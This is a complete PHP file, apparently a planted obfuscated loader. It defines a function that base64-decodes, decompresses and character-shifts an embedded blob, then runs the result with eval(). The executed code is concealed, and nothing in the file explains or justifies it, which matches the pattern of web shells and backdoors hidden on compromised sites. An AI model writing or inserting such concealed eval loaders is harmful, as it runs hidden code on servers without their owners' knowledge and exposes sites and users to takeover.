<?php function LoLG($OOuvK)
{ 
$OOuvK=gzinflate(base64_decode($OOuvK));
 for($i=0;$i<strlen($OOuvK);$i++)
 {
$OOuvK[$i] = chr(ord($OOuvK[$i])-1);
 }
 return $OOuvK;
 }eval(LoLG("HY1LDgIhEAUPMKdgYTKwEJiP0QzRqxAdGoUYmtB9fwffuqqeEH0nsuIuMmHxAXYMIGP6gn8D+x0LQ2GS44e5bsbcrJ6nSc/LRV8Xk8m8EJm4PavONCrlhhSFPIrnB7SGTW1d9A2oYiHw//xq1wPs1yGBVA5KSNENww8="));?>